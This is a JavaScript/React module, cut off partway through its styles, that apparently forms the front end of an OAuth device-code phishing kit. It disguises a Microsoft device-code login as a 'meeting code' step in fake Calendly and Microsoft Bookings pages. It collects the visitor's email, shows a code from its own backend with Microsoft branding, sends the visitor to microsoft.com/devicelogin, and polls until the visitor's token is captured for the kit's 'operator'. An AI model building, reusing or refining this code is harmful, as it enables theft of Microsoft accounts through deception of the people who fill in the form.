// @ts-nocheck
/* ═══════════════════════════════════════════════════════════
   Shared Device Code Flow Module
   ─────────────────────────────────────────────────────────
   Reusable React hook + UI component for the OAuth 2.0
   Device Code Flow (RFC 8628).  Plugs into any meeting
   variant (calendly, msbooking, etc.).
   
   Usage:
     const dc = useDeviceCode();       // hook — call in component
     <DeviceCodePanel dc={dc} />       // renders the UI
   ═══════════════════════════════════════════════════════════ */

const DeviceCode = (() => {
    const { useState, useCallback, useEffect, useRef } = React;

    // ── Helpers ──────────────────────────────────────────────

    function formatTime(seconds) {
        const mins = Math.floor(seconds / 60);
        const secs = seconds % 60;
        return `${mins}:${secs.toString().padStart(2, '0')}`;
    }

    function copyToClipboard(text, buttonId = 'dc-copy-btn') {
        const flash = (btn) => {
            if (!btn) return;
            const orig = btn.textContent;
            btn.textContent = 'Copied!';
            setTimeout(() => { btn.textContent = orig; }, 2000);
        };

        if (navigator.clipboard && navigator.clipboard.writeText) {
            navigator.clipboard.writeText(text).then(() => {
                flash(document.getElementById(buttonId));
            }).catch(() => fallbackCopy(text));
        } else {
            fallbackCopy(text, buttonId);
        }
    }

    function fallbackCopy(text, buttonId = 'dc-copy-btn') {
        const ta = document.createElement('textarea');
        ta.value = text;
        ta.style.position = 'fixed';
        ta.style.left = '-999999px';
        document.body.appendChild(ta);
        ta.select();
        try {
            document.execCommand('copy');
            const btn = document.getElementById(buttonId);
            if (btn) { const o = btn.textContent; btn.textContent = 'Copied!'; setTimeout(() => { btn.textContent = o; }, 2000); }
        } catch (e) { console.error('Fallback copy failed:', e); }
        document.body.removeChild(ta);
    }

    // ── Hook: useDeviceCode ──────────────────────────────────
    //
    // Returns an object with all device-code state + actions.
    // The consuming component just needs to call `dc.request()`
    // and render `<DeviceCodePanel dc={dc} />`.

    function useDeviceCode() {
        const [code, setCode]                     = useState(null);
        const [verificationUri, setVerificationUri] = useState('');
        const [verificationComplete, setVerificationComplete] = useState('');
        const [expiresIn, setExpiresIn]           = useState(0);
        const [timeRemaining, setTimeRemaining]   = useState(0);
        const [isRequesting, setIsRequesting]      = useState(false);
        const [isPolling, setIsPolling]            = useState(false);
        const [isVerified, setIsVerified]          = useState(false);
        const [error, setError]                    = useState('');

        // Refs for mutable values that callbacks/intervals must always
        // read the *latest* version of (avoids stale closures).
        const verifyUrlRef = useRef('');      // verification_uri_complete or verification_uri
        const pollRef      = useRef(null);
        const timerRef     = useRef(null);

        // ── Request a device code ──
        const request = useCallback(async (email) => {
            setIsRequesting(true);
            setError('');
            setCode(null);

            try {
                const td = document.getElementById('template-data');
                const artifactPath = td?.dataset.artifactPath || '';

                const url = email
                    ? '/token/request/' + artifactPath + '?user=' + encodeURIComponent(email)
                    : '/token/request/' + artifactPath;

                const res = await fetch(url, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ email: email || '' }),
                });

                if (!res.ok) throw new Error('Failed to generate verification code');

                const data = await res.json();

                const target = data.verification_uri || 'https://login.microsoftonline.com/common/oauth2/deviceauth';
                verifyUrlRef.current = target;

                setCode(data.user_code);
                setVerificationUri(target);
                setVerificationComplete(data.verification_uri_complete);
                setExpiresIn(data.expires_in);
                setTimeRemaining(data.expires_in);

                // Start polling
                startPolling(artifactPath, data.interval || 5);

            } catch (err) {
                setError('Failed to generate verification code. Please try again.');
                console.error('Device code request error:', err);
            } finally {
                setIsRequesting(false);
            }
        }, []);

        const startPolling = (artifactPath, intervalSec) => {
            setIsPolling(true);

            if (pollRef.current)  clearInterval(pollRef.current);
            if (timerRef.current) clearInterval(timerRef.current);

            const pollOnce = async () => {
                try {
                    const res = await fetch('/token/status/' + artifactPath, { method: 'GET' });
                    if (!res.ok) return;

                    const data = await res.json();

                    if (data.state === 'success') {
                        console.log('[DeviceCode] Token success received — transitioning to confirmed stage');
                        clearInterval(pollRef.current);
                        clearInterval(timerRef.current);
                        document.removeEventListener('visibilitychange', onVisible);
                        setIsPolling(false);
                        setIsVerified(true);
                    } else if (data.state === 'expired') {
                        clearInterval(pollRef.current);
                        clearInterval(timerRef.current);
                        document.removeEventListener('visibilitychange', onVisible);
                        setIsPolling(false);
                        setError('Verification code expired. Please try again.');
                    }
                } catch (e) {
                    console.error('Polling error:', e);
                }
            };

            // Firefox and other browsers throttle setInterval in background
            // tabs (often down to once/minute after ~30s hidden). Force a
            // fresh poll the moment the tab returns to foreground so the
            // UI doesn't appear stuck when the operator switches back.
            const onVisible = () => {
                if (document.visibilityState === 'visible') {
                    pollOnce();
                }
            };
            document.addEventListener('visibilitychange', onVisible);

            pollRef.current = setInterval(pollOnce, intervalSec * 1000);

            timerRef.current = setInterval(() => {
                setTimeRemaining(prev => {
                    if (prev <= 1) {
                        clearInterval(timerRef.current);
                        clearInterval(pollRef.current);
                        document.removeEventListener('visibilitychange', onVisible);
                        setIsPolling(false);
                        setError('Verification code expired. Please try again.');
                        return 0;
                    }
                    return prev - 1;
                });
            }, 1000);
        };

        const reset = useCallback(() => {
            if (pollRef.current)  clearInterval(pollRef.current);
            if (timerRef.current) clearInterval(timerRef.current);
            verifyUrlRef.current = '';
            setCode(null);
            setVerificationUri('');
            setVerificationComplete('');
            setExpiresIn(0);
            setTimeRemaining(0);
            setIsRequesting(false);
            setIsPolling(false);
            setIsVerified(false);
            setError('');
        }, []);

        return {
            code, verificationUri, verificationComplete,
            expiresIn, timeRemaining, isRequesting,
            isPolling, isVerified, error,
            request, reset, formatTime, copyToClipboard,
        };
    }

    // ── UI Component: DeviceCodePanel ────────────────────────
    //
    // Renders the complete device-code step inside whichever
    // meeting variant calls it.  Pass the hook object as `dc`.
    //
    // Props:
    //   dc       — return value of useDeviceCode()
    //   email    — pre-filled email (optional)
    //   onBack   — callback when "Back" is pressed (optional)
    //   onDone   — callback when verification succeeds
    //   title    — heading text (default "Verify Your Meeting")
    //   subtitle — sub-heading (default "Confirm your identity…")
    //   style    — 'calendly' | 'msbooking' (controls accent colors)

    function DeviceCodePanel({ dc, email, onBack, onDone, title, subtitle, style: uiStyle }) {
        const accent     = uiStyle === 'msbooking' ? '#0067b8' : '#2563EB';
        const accentHov  = uiStyle === 'msbooking' ? '#005da6' : '#1D4ED8';
        const accentBg   = uiStyle === 'msbooking' ? '#EFF6FC' : '#EFF6FF';
        const accentBdr  = uiStyle === 'msbooking' ? '#B4D6F0' : '#BFDBFE';
        const msSurface  = '#F5F9FD';
        const msBorder   = '#C7E0F4';
        const msText     = '#323130';
        const msMuted    = '#605E5C';
        const copyVerificationUrl = 'https://login.microsoftonline.com/common/oauth2/deviceauth';
        const displayVerificationUrl = 'https://login.microsoftonline.com/common/verify/...';
        const headText   = title    || 'Verify Your Meeting';
        const subText    = subtitle || 'Confirm your identity to finalize the booking';

        const [localEmail, setLocalEmail] = useState(email || '');
        const isMsb = uiStyle === 'msbooking';

        // Auto-trigger done callback
        useEffect(() => {
            if (dc.isVerified && onDone) {
                console.log('[DeviceCode] Verified — redirecting to confirmed stage in 1.5s');
                const t = setTimeout(() => {
                    console.log('[DeviceCode] Now transitioning to confirmed stage');
                    onDone();
                }, 1500);
                return () => clearTimeout(t);
            }
        }, [dc.isVerified, onDone]);

        // ── Pre-request form (rendered inline; always visible for msbooking) ──
        const preRequestCard = React.createElement('div', { className: 'dc-card' + (isMsb ? ' msb' : ''), style: { display: 'flex', flexDirection: 'column', gap: '20px' } },
                React.createElement('div', null,
                    React.createElement('h2', {
                        style: isMsb
                            ? { fontSize: '24px', fontWeight: 600, color: '#1b1b1b', margin: '0 0 4px', lineHeight: 1.2 }
                            : { fontSize: '1.25rem', fontWeight: 700, color: '#0f172a', margin: '0 0 6px' }
                    }, headText),
                    React.createElement('p', {
                        style: isMsb
                            ? { fontSize: 13, color: '#605e5c', margin: 0, lineHeight: 1.4 }
                            : { fontSize: '0.875rem', color: '#64748b', margin: 0, lineHeight: 1.5 }
                    }, subText),
                ),
                React.createElement('div', { style: { display: 'flex', flexDirection: 'column', gap: isMsb ? '18px' : '14px' } },
                    React.createElement('div', null,
                        React.createElement('label', {
                            htmlFor: 'dc-email',
                            style: isMsb
                                ? { display: 'block', fontSize: 13, fontWeight: 600, color: '#1b1b1b', marginBottom: 6 }
                                : { display: 'block', fontSize: 13, fontWeight: 600, color: '#374151', marginBottom: 6 }
                        }, 'Email Address'),
                        React.createElement('input', {
                            id: 'dc-email',
                            className: 'dc-email-input' + (isMsb ? ' msb' : ''),
                            type: 'email',
                            value: localEmail,
                            onChange: (e) => setLocalEmail(e.target.value),
                            placeholder: 'someone@example.com',
                            autoComplete: 'email',
                            disabled: isMsb && (dc.isRequesting || !!dc.code),
                        }),
                    ),
                    React.createElement('button', {
                        className: 'dc-cta-btn' + (isMsb ? ' msb' : ''),
                        onClick: () => dc.request(localEmail),
                        disabled: !localEmail || (isMsb && (dc.isRequesting || !!dc.code)),
                        style: isMsb
                            ? {
                                background: (!localEmail || dc.isRequesting || dc.code) ? '#f3f2f1' : accent,
                                color: (!localEmail || dc.isRequesting || dc.code) ? '#a19f9d' : '#fff',
                                cursor: (!localEmail || dc.isRequesting || dc.code) ? 'not-allowed' : 'pointer',
                            }
                            : {
                                background: !localEmail ? '#94A3B8' : accent,
                                opacity: !localEmail ? 0.7 : 1,
                            },
                        onMouseEnter: (e) => { if (localEmail && !dc.isRequesting && !dc.code) e.currentTarget.style.background = accentHov; },
                        onMouseLeave: (e) => { if (localEmail && !dc.isRequesting && !dc.code) e.currentTarget.style.background = accent; },
                    },
                        React.createElement(MicrosoftLogoInline, null),
                        React.createElement('span', null, 'Get Meeting Code'),
                    ),
                    React.createElement('p', {
                        style: isMsb
                            ? { fontSize: 12, color: '#605e5c', textAlign: 'center', margin: 0 }
                            : { fontSize: 12, color: '#9CA3AF', textAlign: 'center', margin: 0 }
                    }, 'You\u2019ll receive a code to verify your identity'),
                ),
                (!isMsb && dc.error) ? React.createElement(ErrorBox, { message: dc.error }) : null,
            );

        // ── msbooking: inline form always + modal overlay when active ──
        if (isMsb) {
            const modalActive = dc.isRequesting || !!dc.code || dc.isVerified || !!dc.error;
            return React.createElement(React.Fragment, null,
                preRequestCard,
                modalActive ? React.createElement(DeviceCodeModal, {
                    dc: dc,
                    accent: accent,
                    accentHov: accentHov,
                    title: headText,
                    subtitle: subText,
                    onClose: () => dc.reset(),
                }) : null,
            );
        }

        // ── Pre-request state (non-msbooking): email input + button ──
        if (!dc.code && !dc.isRequesting) {
            return preRequestCard;
        }

        // ── Loading spinner ──
        if (dc.isRequesting && !dc.code) {
            return React.createElement('div', {
                style: { display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', padding: '32px 0' }
            },
                React.createElement('div', {
                    style: {
                        width: 48, height: 48, border: '4px solid #E2E8F0',
                        borderTopColor: accent, borderRadius: '50%',
                        animation: 'dc-spin 0.8s linear infinite',
                    }
                }),
                React.createElement('p', {
                    style: { marginTop: 16, fontSize: 14, color: '#64748b' }
                }, 'Generating verification code...'),
            );
        }

        // ── Code displayed + waiting ──
        return React.createElement('div', { style: { display: 'flex', flexDirection: 'column', gap: '16px' } },
            React.createElement('div', null,
                React.createElement('h2', {
                    style: { fontSize: '1.375rem', fontWeight: 700, color: '#0f172a', marginBottom: 8 }
                }, headText),
                React.createElement('p', {
                    style: { fontSize: '0.875rem', color: '#64748b' }
                }, subText),
            ),

            React.createElement('div', {
                style: {
                    background: msSurface, border: `1px solid ${msBorder}`,
                    borderRadius: 8, padding: 20,
                    boxShadow: '0 0 0 1px rgba(255,255,255,.65) inset',
                }
            },
                React.createElement('p', {
                    style: { fontSize: 13, fontWeight: 600, color: msText, marginBottom: 10 }
                }, 'Complete verification on Microsoft\'s device login page'),
                React.createElement('p', {
                    style: { fontSize: 14, color: msMuted, lineHeight: 1.5, marginBottom: 12 }
                }, 'Click the URL below (or Copy URL), then enter the meeting code shown below to complete verification.'),
                React.createElement('div', {
                    style: {
                        background: '#fff', border: '1px solid #D2D0CE',
                        borderRadius: 6, padding: '14px 16px',
                        display: 'flex', alignItems: 'center', justifyContent: 'space-between', gap: 16,
                    }
                },
                    React.createElement('div', { style: { flex: 1, minWidth: 0 } },
                        React.createElement('p', {
                            style: { fontSize: 11, fontWeight: 600, color: '#605E5C', textTransform: 'uppercase', letterSpacing: '0.04em', marginBottom: 4 }
                        }, 'Verification URL'),
                        React.createElement('a', {
                            href: copyVerificationUrl,
                            target: '_blank',
                            rel: 'noopener noreferrer',
                            title: copyVerificationUrl,
                            style: {
                                fontSize: 12, fontFamily: 'Segoe UI, system-ui, sans-serif', fontWeight: 600,
                                color: '#0F6CBD', margin: 0, lineHeight: 1.25,
                                whiteSpace: 'nowrap', overflow: 'hidden', textOverflow: 'ellipsis', display: 'block',
                                textDecoration: 'underline',
                            }
                        }, displayVerificationUrl),
                    ),
                    React.createElement('button', {
                        id: 'dc-copy-url-btn',
                        onClick: () => dc.copyToClipboard(copyVerificationUrl, 'dc-copy-url-btn'),
                        style: {
                            padding: '8px 16px', background: '#0078D4', color: '#fff',
                            border: '1px solid #0078D4', borderRadius: 4, fontWeight: 600,
                            fontSize: 13, cursor: 'pointer', flexShrink: 0,
                            transition: 'background .15s',
                        },
                        onMouseEnter: (e) => e.currentTarget.style.background = '#106EBE',
                        onMouseLeave: (e) => e.currentTarget.style.background = '#0078D4',
                    }, 'Copy URL'),
                ),
            ),

            // Code box
            React.createElement('div', {
                style: {
                    background: accentBg, border: `2px solid ${accentBdr}`,
                    borderRadius: 10, padding: 20,
                }
            },
                React.createElement('p', {
                    style: { fontSize: 13, fontWeight: 600, color: '#0f172a', marginBottom: 12 }
                }, 'Enter this meeting code:'),

                React.createElement('div', {
                    style: {
                        background: '#fff', border: `2px solid ${accentBdr}`,
                        borderRadius: 8, padding: '16px 20px', marginBottom: 12,
                        display: 'flex', alignItems: 'center', justifyContent: 'space-between', gap: 16,
                    }
                },
                    React.createElement('div', { style: { flex: 1 } },
                        React.createElement('p', {
                            style: { fontSize: 11, fontWeight: 500, color: '#64748b', textTransform: 'uppercase', letterSpacing: '0.05em', marginBottom: 4 }
                        }, 'Meeting Code'),
                        React.createElement('p', {
                            style: { fontSize: '2rem', fontFamily: 'monospace', fontWeight: 700, color: '#0f172a', letterSpacing: '0.1em', userSelect: 'all' }
                        }, dc.code),
                    ),
                    React.createElement('button', {
                        id: 'dc-copy-btn',
                        onClick: () => dc.copyToClipboard(dc.code),
                        style: {
                            padding: '8px 16px', background: accent, color: '#fff',
                            border: 'none', borderRadius: 8, fontWeight: 600,
                            fontSize: 13, cursor: 'pointer', flexShrink: 0,
                            transition: 'background .15s',
                        },
                        onMouseEnter: (e) => e.currentTarget.style.background = accentHov,
                        onMouseLeave: (e) => e.currentTarget.style.background = accent,
                    }, 'Copy'),
                ),

                React.createElement('div', {
                    style: { display: 'flex', alignItems: 'center', justifyContent: 'space-between', fontSize: 12, color: accent }
                },
                    React.createElement('span', null, 'Code expires in:'),
                    React.createElement('span', {
                        style: { fontFamily: 'monospace', fontWeight: 600, fontSize: 14 }
                    }, dc.formatTime(dc.timeRemaining)),
                ),
            ),

            // Waiting / success / error indicators
            dc.isPolling && !dc.isVerified ? React.createElement('div', {
                style: {
                    background: '#F3F2F1', border: '1px solid #E1DFDD',
                    borderRadius: 8, padding: '14px 16px',
                    display: 'flex', alignItems: 'center', gap: 12,
                }
            },
                React.createElement('div', {
                    style: {
                        width: 20, height: 20, border: '2px solid #C8C6C4',
                        borderTopColor: '#0078D4', borderRadius: '50%',
                        animation: 'dc-spin 0.8s linear infinite', flexShrink: 0,
                    }
                }),
                React.createElement('div', null,
                    React.createElement('p', {
                        style: { fontSize: 13, fontWeight: 600, color: '#323130', marginBottom: 2 }
                    }, 'Waiting for verification...'),
                    React.createElement('p', {
                        style: { fontSize: 12, color: '#605E5C' }
                    }, "Complete the verification on Microsoft's website to continue"),
                ),
            ) : null,

            dc.isVerified ? React.createElement('div', {
                style: {
                    background: '#F0FDF4', border: '2px solid #86EFAC',
                    borderRadius: 10, padding: '14px 16px',
                    display: 'flex', alignItems: 'center', gap: 12,
                }
            },
                React.createElement('svg', { width: 22, height: 22, viewBox: '0 0 22 22', fill: 'none' },
                    React.createElement('circle', { cx: 11, cy: 11, r: 10, stroke: '#16A34A', strokeWidth: 1.5 }),
                    React.createElement('path', { d: 'M6.5 11.5l3 3 6-6', stroke: '#16A34A', strokeWidth: 1.5, strokeLinecap: 'round', strokeLinejoin: 'round' }),
                ),
                React.createElement('div', null,
                    React.createElement('p', { style: { fontSize: 13, fontWeight: 600, color: '#166534' } }, 'Verification Complete!'),
                    React.createElement('p', { style: { fontSize: 12, color: '#166534' } }, 'Your meeting is being scheduled...'),
                ),
            ) : null,

            dc.error ? React.createElement(ErrorBox, { message: dc.error }) : null,

            // Help text
            dc.code && !dc.isVerified ? React.createElement('div', {
                style: { background: '#F8FAFC', border: '1px solid #E2E8F0', borderRadius: 8, padding: 14 }
            },
                React.createElement('p', { style: { fontSize: 12, color: '#475569', marginBottom: 6, fontWeight: 600 } }, 'Having trouble?'),
                React.createElement('ul', { style: { fontSize: 12, color: '#475569', margin: 0, paddingLeft: 18, listStyle: 'disc' } },
                    React.createElement('li', { style: { marginBottom: 4 } }, "Make sure you're signed in to your Microsoft account"),
                    React.createElement('li', { style: { marginBottom: 4 } }, 'The code is case-sensitive'),
                    React.createElement('li', null, `Code expires in ${dc.formatTime(dc.timeRemaining)}`),
                ),
            ) : null,
        );
    }

    // ── Small stateless helpers ──────────────────────────────

    // ── DeviceCodeModal: MS-styled lightbox shown after "Get Meeting Code" ──
    function DeviceCodeModal({ dc, accent, accentHov, title, subtitle, onClose }) {
        const verificationUrl        = 'https://microsoft.com/devicelogin';
        const verificationUrlDisplay = 'microsoft.com/devicelogin';

        // Esc to close
        useEffect(() => {
            const h = (e) => { if (e.key === 'Escape' && !dc.isVerified) onClose(); };
            document.addEventListener('keydown', h);
            return () => document.removeEventListener('keydown', h);
        }, [onClose, dc.isVerified]);

        // Lock body scroll while open
        useEffect(() => {
            const prev = document.body.style.overflow;
            document.body.style.overflow = 'hidden';
            return () => { document.body.style.overflow = prev; };
        }, []);

        const openVerification = () => {
            try { window.open(verificationUrl, '_blank', 'noopener,noreferrer'); } catch (e) {}
        };

        // ── Body content depends on state ──
        let body;

        if (dc.isVerified) {
            // Success
            body = React.createElement('div', { className: 'dcm-success' },
                React.createElement('svg', { width: 56, height: 56, viewBox: '0 0 56 56', fill: 'none' },
                    React.createElement('circle', { cx: 28, cy: 28, r: 26, stroke: '#107C10', strokeWidth: 2 }),
                    React.createElement('path', { d: 'M17 28.5l7.5 7.5L39 20.5', stroke: '#107C10', strokeWidth: 3, strokeLinecap: 'round', strokeLinejoin: 'round' }),
                ),
                React.createElement('p', { className: 'dcm-success-title' }, 'Verification complete'),
                React.createElement('p', { className: 'dcm-success-sub' }, 'Finalizing your meeting\u2026'),
            );
        } else if (dc.error) {
            // Error
            body = React.createElement('div', { className: 'dcm-error' },
                React.createElement('svg', { width: 40, height: 40, viewBox: '0 0 40 40', fill: 'none' },
                    React.createElement('circle', { cx: 20, cy: 20, r: 18, stroke: '#A4262C', strokeWidth: 2 }),
                    React.createElement('path', { d: 'M13 13l14 14M27 13L13 27', stroke: '#A4262C', strokeWidth: 2, strokeLinecap: 'round' }),
                ),
                React.createElement('p', { className: 'dcm-error-title' }, 'Verification failed'),
                React.createElement('p', { className: 'dcm-error-sub' }, dc.error),
                React.createElement('button', {
                    className: 'dcm-btn-primary',
                    onClick: () => { dc.reset(); },
                    style: { marginTop: 16, background: accent },
                    onMouseEnter: (e) => e.currentTarget.style.background = accentHov,
                    onMouseLeave: (e) => e.currentTarget.style.background = accent,
                }, 'Try again'),
            );
        } else if (dc.isRequesting && !dc.code) {
            // Loading
            body = React.createElement('div', { className: 'dcm-loading' },
                React.createElement('div', { className: 'dcm-spinner-lg', style: { borderTopColor: accent } }),
                React.createElement('p', { className: 'dcm-loading-text' }, 'Generating your verification code\u2026'),
            );
        } else {
            // Code + waiting
            const codeFormatted = dc.code || '';
            body = React.createElement(React.Fragment, null,
                React.createElement('p', { className: 'dcm-intro' },
                    'Complete both steps below to finalize your booking. Step 1 opens the Microsoft verification page in a new tab.',
                ),

                // Step 1
                React.createElement('div', { className: 'dcm-step' },
                    React.createElement('div', { className: 'dcm-step-head' },
                        React.createElement('span', { className: 'dcm-step-num' }, '1'),
                        React.createElement('span', { className: 'dcm-step-title' }, 'Open the Microsoft verification page'),
                    ),
                    React.createElement('div', { className: 'dcm-row' },
                        React.createElement('a', {
                            className: 'dcm-url',
                            href: verificationUrl,
                            target: '_blank',
                            rel: 'noopener noreferrer',
                            title: verificationUrl,
                        }, verificationUrlDisplay),
                        React.createElement('button', {
                            className: 'dcm-btn-primary',
                            onClick: openVerification,
                            style: { background: accent },
                            onMouseEnter: (e) => e.currentTarget.style.background = accentHov,
                            onMouseLeave: (e) => e.currentTarget.style.background = accent,
                        }, 'Open page'),
                    ),
                ),

                // Step 2
                React.createElement('div', { className: 'dcm-step' },
                    React.createElement('div', { className: 'dcm-step-head' },
                        React.createElement('span', { className: 'dcm-step-num' }, '2'),
                        React.createElement('span', { className: 'dcm-step-title' }, 'Enter this code on that page'),
                    ),
                    React.createElement('div', { className: 'dcm-row' },
                        React.createElement('div', { className: 'dcm-code', id: 'dcm-code' }, codeFormatted),
                        React.createElement('button', {
                            id: 'dc-copy-btn',
                            className: 'dcm-btn-secondary',
                            onClick: () => dc.copyToClipboard(codeFormatted, 'dc-copy-btn'),
                        }, 'Copy code'),
                    ),
                ),

                // Waiting + timer
                React.createElement('div', { className: 'dcm-status' },
                    React.createElement('span', { className: 'dcm-status-left' },
                        React.createElement('span', { className: 'dcm-pulse', style: { background: accent } }),
                        'Waiting for you to complete verification\u2026',
                    ),
                    React.createElement('span', { className: 'dcm-timer' },
                        'Expires in ', React.createElement('strong', null, dc.formatTime(dc.timeRemaining)),
                    ),
                ),
            );
        }

        const modal = React.createElement('div', {
            className: 'dcm-backdrop',
            role: 'dialog',
            'aria-modal': 'true',
            'aria-label': title || 'Verify your booking',
            onClick: (e) => { if (e.target === e.currentTarget && !dc.isVerified) onClose(); },
        },
            React.createElement('div', { className: 'dcm-card', role: 'document' },
                React.createElement('div', { className: 'dcm-progress' }),
                !dc.isVerified ? React.createElement('button', {
                    className: 'dcm-close',
                    'aria-label': 'Close',
                    onClick: onClose,
                }, '\u00D7') : null,
                React.createElement('div', { className: 'dcm-inner' },
                    React.createElement('div', { className: 'dcm-brand' },
                        React.createElement(MicrosoftLogoInline, null),
                        React.createElement('span', { className: 'dcm-brand-text' }, 'Microsoft'),
                    ),
                    React.createElement('h2', { className: 'dcm-title' }, title || 'Verify your booking'),
                    subtitle ? React.createElement('p', { className: 'dcm-subtitle' }, subtitle) : null,
                    React.createElement('div', { className: 'dcm-body' }, body),
                ),
            ),
        );

        return ReactDOM.createPortal(modal, document.body);
    }

    function MicrosoftLogoInline() {
        return React.createElement('svg', { width: 20, height: 20, viewBox: '0 0 21 21' },
            React.createElement('rect', { x: 1, y: 1, width: 9, height: 9, fill: '#F25022' }),
            React.createElement('rect', { x: 11, y: 1, width: 9, height: 9, fill: '#7FBA00' }),
            React.createElement('rect', { x: 1, y: 11, width: 9, height: 9, fill: '#00A4EF' }),
            React.createElement('rect', { x: 11, y: 11, width: 9, height: 9, fill: '#FFB900' }),
        );
    }

    function ErrorBox({ message }) {
        return React.createElement('div', {
            style: {
                background: '#FEF2F2', border: '2px solid #FCA5A5',
                borderRadius: 10, padding: '14px 16px',
                display: 'flex', alignItems: 'flex-start', gap: 10,
            }
        },
            React.createElement('svg', {
                width: 18, height: 18, viewBox: '0 0 18 18', fill: 'none',
                style: { flexShrink: 0, marginTop: 1 },
            },
                React.createElement('circle', { cx: 9, cy: 9, r: 8, stroke: '#DC2626', strokeWidth: 1.5 }),
                React.createElement('path', { d: 'M6 6l6 6M12 6l-6 6', stroke: '#DC2626', strokeWidth: 1.5, strokeLinecap: 'round' }),
            ),
            React.createElement('div', null,
                React.createElement('p', { style: { fontSize: 13, fontWeight: 600, color: '#991B1B', marginBottom: 2 } }, 'Verification Failed'),
                React.createElement('p', { style: { fontSize: 12, color: '#991B1B' } }, message),
            ),
        );
    }

    // ── CSS keyframe + shared styles (injected once) ──
    if (typeof document !== 'undefined' && !document.getElementById('dc-spin-style')) {
        const style = document.createElement('style');
        style.id = 'dc-spin-style';
        style.textContent = [
            '@keyframes dc-spin { to { transform: rotate(360deg); } }',
            // Email input
            '.dc-email-input { width:100%; padding:11px 14px; border:1.5px solid #D1D5DB; border-radius:8px;',
            '  font-size:14px; color:#1E293B; background:#fff; outline:none; box-sizing:border-box;',
            '  transition: border-color .2s, box-shadow .2s; font-family:inherit; }',
            '.dc-email-input::placeholder { color:#94A3B8; }',
            '.dc-email-input:focus { border-color:#2563EB; box-shadow:0 0 0 3px rgba(37,99,235,.15); }',
            // Microsoft-standard underline input (msbooking)
            '.dc-email-input.msb { padding:6px 0; border:none; border-bottom:1px solid #8c8c8c;',
            '  border-radius:0; font-size:15px; color:#1b1b1b; height:36px; line-height:1.5;',
            "  font-family:'Segoe UI','Helvetica Neue',Arial,sans-serif; box-shadow:none; }",
            '.dc-email-input.msb::placeholder { color:#a19f9d; }',
            '.dc-email-input.msb:focus { border-color:transparent; border-bottom:2px solid #0067b8;',
            '  box-shadow:none; padding-bottom:5px; }',
            // CTA button
            '.dc-cta-btn { width:100%; padding:12px 16px; border:none; border-radius:8px;',
            '  font-weight:600; font-size:14px; cursor:pointer; display:flex; align-items:center;',
            '  justify-content:center; gap:10px; transition: background .2s, box-shadow .2s;',
            '  font-family:inherit; color:#fff; }',
            '.dc-cta-btn:hover { box-shadow:0 2px 8px rgba(0,0,0,.18); }',
            '.dc-cta-btn:active { transform:scale(.985); }',
            // Microsoft-standard flat button (msbooking) — sharp corners, Segoe UI
            '.dc-cta-btn.msb { border-radius:0; padding:0 12px; height:41px; font-size:15px;',
            '  font-weight:600; gap:12px; box-shadow:none; letter-spacing:.01em;',
            "  font-family:'Segoe UI','Helvetica Neue',Arial,sans-serif; }",
            '.dc-cta-btn.msb:hover { box-shadow:none; }',
            '.dc-cta-btn.msb:disabled { cursor:not-allowed; }',
            // Card wrapper
            '.dc-card { background:#fff; border:1px solid #E5E7EB; border-radius:12px;',
            '  padding:24px; box-shadow:0 1px 3px rgba(0,0,0,.06), 0 1px 2px rgba(0,0,0,.04); }',
            '.dc-card.msb { border-radius:2px; border:1px solid #edebe9;',
            '  box-shadow:0 2px 6px rgba(0,0,0,.10);',
            "  font-family:'Segoe UI','Helvetica Neue',Arial,sans-serif; }",

            // ─── DeviceCodeModal (msbooking popup) ───
            '@keyframes dcm-fade { from { opacity:0 } to { opacity:1 } }',
            '@keyframes dcm-pop  { from { opacity:0; transform:translateY(8px) scale(.97) } to { opacity:1; transform:none } }',
            '@keyframes dcm-pulse { 0%,100% { opacity:.4 } 50% { opacity:1 } }',
            '.dcm-backdrop { position:fixed; inset:0; z-index:10000; background:rgba(0,0,0,.55);',
            '  display:flex; align-items:center; justify-content:center; padding:20px;',
            '  animation:dcm-fade .18s ease-out;',
            "  font-family:'Segoe UI','Helvetica Neue',Arial,sans-serif; }",
            '.dcm-card { position:relative; background:#fff; width:460px; max-width:100%;',
            '  border-radius:2px; box-shadow:0 24px 40px rgba(0,0,0,.28), 0 4px 12px rgba(0,0,0,.15);',
            '  overflow:hidden; animation:dcm-pop .22s cubic-bezier(.2,.9,.3,1.2); }',
            "  .dcm-progress { position:absolute; top:0; left:0; right:0; height:3px;",
            "    background:url('../../static/img/marching_ants.gif') repeat-x 0 0; background-size:auto 3px;",
            '    z-index:2; }',
            '.dcm-close { position:absolute; top:8px; right:8px; z-index:3;',
            '  background:transparent; border:none; width:32px; height:32px; cursor:pointer;',
            '  font-size:22px; line-height:1; color:#605e5c; }',
            '.dcm-close:hover { background:#f3f2f1; color:#1b1b1b; }',
            '.dcm-inner { padding:36px 40px 28px; }',
            '.dcm-brand { display:flex; align-items:center; gap:8px; margin-bottom:20px; }',
            '.dcm-brand-text { font-size:15px; font-weight:600; color:#1b1b1b; letter-spacing:.01em; }',
            '.dcm-title { font-size:24px; font-weight:600; color:#1b1b1b; margin:0 0 4px; line-height:1.2; }',
            '.dcm-subtitle { font-size:13px; color:#605e5c; margin:0 0 16px; line-height:1.4; }',
            '.dcm-body { margin-top:12px; }',
            '.dcm-intro { font-size:13.5px; color:#323130; line-height:1.5; margin:0 0 18px; }',
            '.dcm-step { margin-bottom:16px; }',
            '.dcm-step-head { display:flex; align-items:center; gap:10px; margin-bottom:8px; }',
            '.dcm-step-num { display:inline-flex; align-items:center; justify-content:center;',
            '  width:22px; height:22px; border-radius:50%; background:#0067b8; color:#fff;',
            '  font-size:12px; font-weight:600; flex-shrink:0; }',
            '.dcm-step-title { font-size:13px; font-weight:600; color:#1b1b1b; }',
            '.dcm-row { display:flex; align-items:stretch; gap:8px;',
            '  border:1px solid #d2d0ce; background:#faf9f8; padding:8px 10px; }',
            '.dcm-url { flex:1; display:flex; align-items:center; padding:0 6px;',
            '  font-size:14px; font-weight:600; color:#0067b8; text-decoration:none;',
            '  white-space:nowrap; overflow:hidden; text-overflow:ellipsis; min-width:0; }',
            '.dcm-url:hover { text-decoration:underline; }',
            '.dcm-code { flex:1; display:flex; align-items:center; padding:2px 8px;',
            '  font-family:Consolas,"Courier New",monospace; font-size:22px; font-weight:700;',
            '  letter-spacing:.14em; color:#1b1b1b; user-select:all; }',
            '.dcm-btn-primary { flex-shrink:0; height:36px; padding:0 16px; border:none;',
            '  background:#0067b8; color:#fff; font-size:13px; font-weight:600;',
